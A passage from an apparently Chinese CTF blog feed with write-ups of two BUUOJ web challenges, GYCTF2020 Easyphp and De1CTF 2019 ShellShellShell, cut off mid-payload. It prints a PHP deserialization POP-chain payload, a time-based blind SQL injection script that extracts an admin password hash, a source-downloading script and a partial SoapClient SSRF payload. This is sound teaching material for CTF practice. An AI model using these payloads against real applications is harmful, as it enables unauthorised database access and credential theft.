46864d311dd58b7bbafc570cfbb6cf2530e627ab0efaac3b36beeebca316c893a7f3fa29baac16f87dbbd282dfc39f9e6f511df1bbd7a24262c6b7f97e361cec880592177f8890622907b74504771568f4013ea7f774c2f9d7c88f1d663e5d3d686bf662542a827ec1d2e3b48d0776d1ef1c4c506b509d68becc50d415009b3ff917a6509e656983cad143256b99b39dbfdbfdc9e33ea6d54851cb5434a88d231c5a34fc3345cf0899ad182725e4a321ee17c0de7f30fcc8fef23bf308c6976b08d23440845a143adb0b315573d6</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>BUUOJ-web刷题（三）</title>
    <link href="http://yoursite.com/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>http://yoursite.com/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/</id>
    <published>2020-03-25T12:37:11.000Z</published>
    <updated>2020-04-03T03:11:18.292Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x-01-GYCTF2020-Easyphp"><a href="#0x-01-GYCTF2020-Easyphp" class="headerlink" title="0x 01 [GYCTF2020]Easyphp"></a>0x 01 [GYCTF2020]Easyphp</h3><ol><li>下载<a href="http://www.zip分析源代码，在login.php中ban掉了一大堆关键字，伪协议读取源代码无法实现" target="_blank" rel="noopener">www.zip分析源代码，在login.php中ban掉了一大堆关键字，伪协议读取源代码无法实现</a></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$user&#x3D;new user();</span><br><span class="line">if(isset($_POST[&#39;username&#39;]))&#123;</span><br><span class="line">if(preg_match(&quot;&#x2F;union|select|drop|delete|insert|\#|\%|\&#96;|\@|\\\\&#x2F;i&quot;, $_POST[&#39;username&#39;]))&#123;</span><br><span class="line">die(&quot;&lt;br&gt;Damn you, hacker!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(preg_match(&quot;&#x2F;union|select|drop|delete|insert|\#|\%|\&#96;|\@|\\\\&#x2F;i&quot;, $_POST[&#39;password&#39;]))&#123;</span><br><span class="line">die(&quot;Damn you, hacker!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$user-&gt;login();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>login()函数来自lib.php。update.php里实例化了一个User()类，并update()。如果$_SESSION[‘login’]===1就输出flag。</p><ol start="2"><li>本题重点就是lib.php了。User类的login()从POST获取username和password后执行查询，将返回结果赋值给SESSION，跳过分析update.php，里面出现了unserialize()函数，这里是本题的关键</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public function update()&#123;</span><br><span class="line">        $Info&#x3D;unserialize($this-&gt;getNewinfo());</span><br><span class="line">        $age&#x3D;$Info-&gt;age;</span><br><span class="line">        $nickname&#x3D;$Info-&gt;nickname;</span><br><span class="line">        $updateAction&#x3D;new UpdateHelper($_SESSION[&#39;id&#39;],$Info,&quot;update user SET age&#x3D;$age,nickname&#x3D;$nickname where id&#x3D;&quot;.$_SESSION[&#39;id&#39;]);</span><br><span class="line">        &#x2F;&#x2F;这个功能还没有写完 先占坑</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>先反序列化getNewInfo()返回值，又调用了UpdateHelper()。getNewInfo()代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function getNewInfo()&#123;</span><br><span class="line">        $age&#x3D;$_POST[&#39;age&#39;];</span><br><span class="line">        $nickname&#x3D;$_POST[&#39;nickname&#39;];</span><br><span class="line">        return safe(serialize(new Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>从POST获取age和nickname，返回safe()处理后的Info()序列化结果。safe()简单的将一堆关键字替换成’hacker’，这里会造成反序列化字符逃逸。接下来分析info类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class Info&#123;</span><br><span class="line">    public $age;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public $CtrlCase;</span><br><span class="line">    public function __construct($age,$nickname)&#123;</span><br><span class="line">        $this-&gt;age&#x3D;$age;</span><br><span class="line">        $this-&gt;nickname&#x3D;$nickname;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __call($name,$argument)&#123;</span><br><span class="line">        echo $this-&gt;CtrlCase-&gt;login($argument[0]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有一个__call的魔术方法，当我们调用一个不存在的方法时会调用CtrlCase-&gt;login()方法，这里我们发现只有dbCtrl类有login()方法还需要一个参数，跟进dbCtrl类有login()方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public function login($sql)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mysqli&#x3D;new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database);</span><br><span class="line">        if ($this-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            die(&quot;连接失败，错误:&quot; . $this-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result&#x3D;$this-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(&#39;s&#39;, $this-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        if ($this-&gt;token&#x3D;&#x3D;&#39;admin&#39;) &#123;</span><br><span class="line">            return $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!$idResult) &#123;</span><br><span class="line">            echo(&#39;用户不存在!&#39;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if (md5($this-&gt;password)!&#x3D;&#x3D;$passwordResult) &#123;</span><br><span class="line">            echo(&#39;密码错误！&#39;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[&#39;token&#39;]&#x3D;$this-&gt;name;</span><br><span class="line">        return $idResult;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里就可以控制查询语句，把admin账户的密码查出来。得到admin用户的SQL语句不难写<code>select password,username from user where username=?</code>，因为login()返回的是idResult，第一个结果。接下来是想办法触发info类的call方法，回过头看User类，update()函数用到了Info类，UpdateHelper也用到了，但是这些都没有涉及到方法的调用，但是我们发现存在__toString()方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;nickname-&gt;update($this-&gt;age);</span><br><span class="line">        return &quot;0-0&quot;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>nickname哪里来的？unserialize(getNewInfo())得到的，如果nickname是Info类，nickname-&gt;update就会触发Info的<code>__call()</code>方法。接着想办法触发<code>__tostring()</code>方法，我们发现UpdateHelper类的<code>__destruct()</code>方法，会<code>echo $this-&gt;sql</code>，当$sql = new User()时就会触发User类的<code>__toString()</code>魔术方法。接着是构造怎么触发</p><p>pop链的思路：利用UpdateHelper类<code>__destruct()</code>触发User类<code>__toString()</code>,利用Info类没有update()触发其<code>__call()</code>，把$this-&gt;CtrlCase实例化成dbCtrl对象，再调用dbCtrl类login()，通过控制查询语句，把admin账户的密码查出来。</p><p>完整payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age &#x3D; null;</span><br><span class="line">    public $nickname &#x3D; null;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Info</span><br><span class="line">&#123;</span><br><span class="line">    public $age;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public $CtrlCase;</span><br><span class="line"></span><br><span class="line">    public function __construct($age, $nickname)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;age &#x3D; $age;</span><br><span class="line">        $this-&gt;nickname &#x3D; $nickname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class UpdateHelper</span><br><span class="line">&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $newinfo;</span><br><span class="line">    public $sql;</span><br><span class="line"></span><br><span class="line">    public function __construct($newInfo, $sql)</span><br><span class="line">    &#123;</span><br><span class="line">        $newInfo &#x3D; unserialize($newInfo);</span><br><span class="line">        $upDate &#x3D; new dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class dbCtrl</span><br><span class="line">&#123;</span><br><span class="line">    public $hostname &#x3D; &quot;127.0.0.1&quot;;</span><br><span class="line">    public $dbuser &#x3D; &quot;root&quot;;</span><br><span class="line">    public $dbpass &#x3D; &quot;root&quot;;</span><br><span class="line">    public $database &#x3D; &quot;test&quot;;</span><br><span class="line">    public $name &#x3D; &quot;admin&quot;;</span><br><span class="line">    public $password;</span><br><span class="line">    public $mysqli;</span><br><span class="line">    public $token &#x3D; &quot;admin&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$db &#x3D; new dbCtrl();</span><br><span class="line">$user &#x3D; new User();</span><br><span class="line">$info &#x3D; new Info(&#39;&#39;,&#39;1&#39;);</span><br><span class="line">#echo serialize($info);</span><br><span class="line">$updatehelper &#x3D; new UpdateHelper(&quot;1&quot;, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">$info-&gt;CtrlCase &#x3D; $db;</span><br><span class="line">$user-&gt;nickname &#x3D; $info;</span><br><span class="line">$user-&gt;age &#x3D; &quot;select password,id from user where username&#x3D;?&quot;;</span><br><span class="line">$updatehelper-&gt;sql &#x3D; $user;</span><br><span class="line">&#x2F;&#x2F; echo serialize($updatehelper);</span><br><span class="line">$c &#x3D; &#39;&quot;;s:8:&quot;CtrlCase&quot;;&#39; . serialize($updatehelper) . &quot;&#125;&quot;;</span><br><span class="line">$length &#x3D; strlen($c);</span><br><span class="line">$c &#x3D; str_repeat(&#39;union&#39;, $length).$c;    &#x2F;&#x2F;一个union被替换成hacker后可以逃逸出一个字符，要是嫌弃union太多可以用’（替换后逃逸五个字符）加上union</span><br><span class="line">echo($c);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在update.php内post提交age=&amp;nickname=加代码的输出结果，就会得到admin密码的md5值，cmd5解密后登录，得到flag。</p><p>参考资料：</p><blockquote><p><a href="https://blog.csdn.net/weixin_43610673/article/details/104549353" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43610673/article/details/104549353</a></p><p><a href="https://tiaonmmn.github.io/2020/03/04/BUUOJ刷题-Web-GYCTF2020-Easyphp/" target="_blank" rel="noopener">https://tiaonmmn.github.io/2020/03/04/BUUOJ%E5%88%B7%E9%A2%98-Web-GYCTF2020-Easyphp/</a></p></blockquote><h3 id="0x-02-De1CTF-2019-ShellShellShell"><a href="#0x-02-De1CTF-2019-ShellShellShell" class="headerlink" title="0x 02 [De1CTF 2019]ShellShellShell"></a>0x 02 [De1CTF 2019]ShellShellShell</h3><ul><li><p>考点</p><p>源码泄漏、反序列化、ssrf、代码审计</p></li><li><p>解题步骤</p></li></ul><ol><li>使用dirsearch发现题目存在源码泄露，编写脚本将题目代码保存到本地进行审计</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#coding&#x3D;utf-8</span><br><span class="line"># import requests</span><br><span class="line">import urllib</span><br><span class="line">import os</span><br><span class="line">os.system(&#39;mkdir source&#39;)</span><br><span class="line">os.system(&#39;mkdir source&#x2F;views&#39;)</span><br><span class="line">file_list_first&#x3D;[&#39;index.php&#39;,&#39;config.php&#39;,&#39;user.php&#39;]</span><br><span class="line">file_list_second&#x3D;[&#39;views&#x2F;delete&#39;,&#39;views&#x2F;index&#39;,&#39;views&#x2F;login&#39;,&#39;views&#x2F;logout&#39;,&#39;views&#x2F;phpinfo&#39;,&#39;views&#x2F;profile&#39;,&#39;views&#x2F;publish&#39;,&#39;views&#x2F;register&#39;]</span><br><span class="line">part_url&#x3D;&#39;http:&#x2F;&#x2F;5c15c1df-00fd-4ce7-a354-a4e4855c42e4.node3.buuoj.cn&#x2F;&#39;</span><br><span class="line">for i in file_list_first:</span><br><span class="line">    url&#x3D;part_url+i+&#39;~&#39;</span><br><span class="line">    print &#39;download %s &#39;% url</span><br><span class="line">    print os.system(&#39;curl &#39;+url+&#39;&gt;source&#x2F;&#39;+i)</span><br><span class="line">for i in file_list_second:</span><br><span class="line">    url&#x3D;part_url+i</span><br><span class="line">    print &#39;download %s &#39;% url</span><br><span class="line">    print os.system(&#39;curl &#39;+url+&#39;&gt;source&#x2F;&#39;+i+&#39;.php&#39;)</span><br></pre></td></tr></table></figure><p>得到如图所示的目录结构</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200326194620571.png" alt></p><ol start="2"><li>爆破出验证码之后登陆进去发现有几个功能</li></ol><p>/index.php?action=profile:</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200327103030632.png" alt></p><p>/index.php?action=publish:</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200327103059191.png" alt></p><p>发现可控的参数只有publish页面的signature和mood参数，看一下publish源码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if($C-&gt;is_admin&#x3D;&#x3D;0) &#123;</span><br><span class="line">    if (isset($_POST[&#39;signature&#39;]) &amp;&amp; isset($_POST[&#39;mood&#39;])) &#123;</span><br><span class="line">        $res &#x3D; @$C-&gt;publish();</span><br><span class="line">        if($res)&#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#39;ok&#39;);self.location&#x3D;&#39;index.php?action&#x3D;index&#39;; &lt;&#x2F;script&gt;&quot;;</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#39;something error&#39;);self.location&#x3D;&#39;index.php?action&#x3D;publish&#39;; &lt;&#x2F;script&gt;&quot;;</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>跟进Customer::publish()方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function publish()</span><br><span class="line">    &#123;</span><br><span class="line">        if(!$this-&gt;check_login()) return false;</span><br><span class="line">        if($this-&gt;is_admin &#x3D;&#x3D; 0)</span><br><span class="line">        &#123;</span><br><span class="line">            if(isset($_POST[&#39;signature&#39;]) &amp;&amp; isset($_POST[&#39;mood&#39;])) &#123;</span><br><span class="line"></span><br><span class="line">                $mood &#x3D; addslashes(serialize(new Mood((int)$_POST[&#39;mood&#39;],get_ip())));</span><br><span class="line">                $db &#x3D; new Db();</span><br><span class="line">                @$ret &#x3D; $db-&gt;insert(array(&#39;userid&#39;,&#39;username&#39;,&#39;signature&#39;,&#39;mood&#39;),&#39;ctf_user_signature&#39;,array($this-&gt;userid,$this-&gt;username,$_POST[&#39;signature&#39;],$mood));</span><br><span class="line">                if($ret)</span><br><span class="line">                    return true;</span><br><span class="line">                else</span><br><span class="line">                    return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p>接受POST请求的参数，这里$mood被转换为int类型所以只有$signature完全可控，跟进Db::insert()方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public function insert($columns,$table,$values)&#123;</span><br><span class="line"></span><br><span class="line">        $column &#x3D; $this-&gt;get_column($columns);</span><br><span class="line">        $value &#x3D; &#39;(&#39;.preg_replace(&#39;&#x2F;&#96;([^&#96;,]+)&#96;&#x2F;&#39;,&#39;\&#39;$&#123;1&#125;\&#39;&#39;,$this-&gt;get_column($values)).&#39;)&#39;;</span><br><span class="line">        $nid &#x3D;</span><br><span class="line">        $sql &#x3D; &#39;insert into &#39;.$table.&#39;(&#39;.$column.&#39;) values &#39;.$value;</span><br><span class="line">        $result &#x3D; $this-&gt;conn-&gt;query($sql);</span><br><span class="line"></span><br><span class="line">        return $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>跟进Db::get_column()方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">private function get_column($columns)&#123;</span><br><span class="line">        if(is_array($columns))</span><br><span class="line">            $column &#x3D; &#39; &#96;&#39;.implode(&#39;&#96;,&#96;&#39;,$columns).&#39;&#96; &#39;;</span><br><span class="line">        else</span><br><span class="line">            $column &#x3D; &#39; &#96;&#39;.$columns.&#39;&#96; &#39;;</span><br><span class="line">        return $column;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>会以`,`为连接符操作数组，并在两端加上`符号，相当于先将<code>$value</code>数组的每个值用反引号引起来，然后再用逗号连接起来，变成这样的字符串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;$value[0]&#96;,&#96;$value[1]&#96;，&#96;$value[1]&#96;</span><br></pre></td></tr></table></figure><p>接着经过这个正则替换之后将匹配字符串中所有反引号之间的内容，将其取出放到两个单引号里面，然后放入insert语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &#39;insert into &#39;.$table.&#39;(&#39;.$column.&#39;) values &#39;.$value;</span><br></pre></td></tr></table></figure><p>如果<code>$value</code>元素本身带有反引号，就会破坏掉拼接的结构，在做反引号变为单引号的时候造成问题，比如说:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">考虑$value为 : array(&quot;admin&#96;,&#96;1&#96;)#&quot;,&quot;password&quot;)</span><br><span class="line">经过处理后，就变为了 : (&#39;admin&#39;,&#39;1&#39;)#&#96;,&#39;password&#39; )</span><br><span class="line">相当于闭合了单引号，造成注入。</span><br></pre></td></tr></table></figure><p>本地可以测试一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$columns &#x3D; array(&#39;a&#39;,&#39;b&#39;,&#39;c&#96;,sql)#&#39;,&#39;d&#39;);</span><br><span class="line">if(is_array($columns))</span><br><span class="line">    $column &#x3D; &#39; &#96;&#39;.implode(&#39;&#96;,&#96;&#39;,$columns).&#39;&#96; &#39;;</span><br><span class="line">else</span><br><span class="line">    $column &#x3D; &#39; &#96;&#39;.$columns.&#39;&#96; &#39;;</span><br><span class="line"></span><br><span class="line">echo $column.&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &#39;(&#39;.preg_replace(&#39;&#x2F;&#96;([^&#96;,]+)&#96;&#x2F;&#39;,&#39;\&#39;$&#123;1&#125;\&#39;&#39;,$column).&#39;)&#39;;</span><br><span class="line">&#x2F;&#x2F;output</span><br><span class="line">&#96;a&#96;,&#96;b&#96;,&#96;c&#96;,sql)#&#96;,&#96;d&#96;</span><br><span class="line">( &#39;a&#39;,&#39;b&#39;,&#39;c&#39;,sql)#&#96;,&#39;d&#39; )</span><br></pre></td></tr></table></figure><p>获取admin密码脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;cfa4fe25-3f41-4b51-94cc-ffb813030907.node3.buuoj.cn&#x2F;index.php?action&#x3D;publish&#39;</span><br><span class="line">cookies &#x3D; &#123;</span><br><span class="line">    &quot;PHPSESSID&quot;: &quot;609p5gi14cubaulus8h2vh3rj1&quot;   #先登陆，然后换cookie</span><br><span class="line">&#125;</span><br><span class="line">text&#x3D;&#39;&#39;</span><br><span class="line">for i in range(1,33):</span><br><span class="line">    l&#x3D;28</span><br><span class="line">    h&#x3D;126</span><br><span class="line">    while abs(h - l) &gt; 1:</span><br><span class="line">        mid&#x3D;(l+h)&#x2F;2</span><br><span class="line">        payload&#x3D;&#39;c&#96;,if(((ascii(mid((select password from ctf_users limit 1),&#123;&#125;,1)))&gt;&#123;&#125;),sleep(3),1))#&#39;</span><br><span class="line">        data&#x3D;&#123;</span><br><span class="line">            &#39;signature&#39;:payload.format(i,mid),</span><br><span class="line">            &#39;mood&#39;:0</span><br><span class="line">        &#125;</span><br><span class="line">        now_t&#x3D;time.time()</span><br><span class="line">        re&#x3D;requests.post(url,data&#x3D;data,cookies&#x3D;cookies)</span><br><span class="line">        #print(re.text)</span><br><span class="line">        if time.time()-now_t &gt; 3:</span><br><span class="line">            l&#x3D;mid</span><br><span class="line">        else:</span><br><span class="line">            h&#x3D;mid</span><br><span class="line">    mid_num &#x3D; int((l+h+1) &#x2F; 2)</span><br><span class="line">    text +&#x3D; chr(int(h))</span><br><span class="line">    print(text)</span><br></pre></td></tr></table></figure><ol start="3"><li>得到MD5:c991707fdf339958eded91331fb11ba0,解得jaivypassword，尝试进行登录发现页面回显<code>You can only login at the usual address</code>，在源代码包全局搜索这一字符串，在user.php处找到</li></ol><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200327104310957.png" alt></p><p>分析代码可知$user的值来源于$ret</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@$ret &#x3D; $db-&gt;select(array(&#39;id&#39;,&#39;username&#39;,&#39;ip&#39;,&#39;is_admin&#39;,&#39;allow_diff_ip&#39;),&#39;ctf_users&#39;,&quot;username &#x3D; &#39;$username&#39; and password &#x3D; &#39;$password&#39; limit 1&quot;);</span><br></pre></td></tr></table></figure><p>get_ip是由$_SERVER[’‘REMOTE_ADDR’]获得的，需要ssrf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function get_ip()&#123;</span><br><span class="line">    return $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在use.php的showmess方法中找到反序列化函数</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200327222624765.png" alt></p><p>这里的row[2]，为上面select查询中的mood字段值。SSRF+反序列化，SSRF可用使用内置类Soapclient，并且下面还调用了一个getcountry的自定义方法，正好可用触发Soapclient::__call进行网络请求</p><p>新建一个窗口,替换payload中的cookie和爆破后的code</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200328000047237.png" alt></p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?action&#x3D;login&quot;;</span><br><span class="line">$post_string &#x3D; &#39;username&#x3D;admin&amp;password&#x3D;jaivypassword&amp;code&#x3D;113713&#39;;&#x2F;&#x2F;换code</span><br><span class="line">$headers &#x3D; array(</span><br><span class="line">    &#39;Cookie: PHPSESSID&#x3D;u1umj91lggqgj0ccibd81h3d91&#39;,&#x2F;&#x2F;换cookie</span><br><span class="line">);</span><br><span class="line">$b &#x3D; new SoapClient(null,array(&#39;location&#39; &#x3D;&gt; $target,&#39;user_agent&#39;&#x3D;&gt;&#39;w4nder^^Content-Type: application&#x2F;x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;. 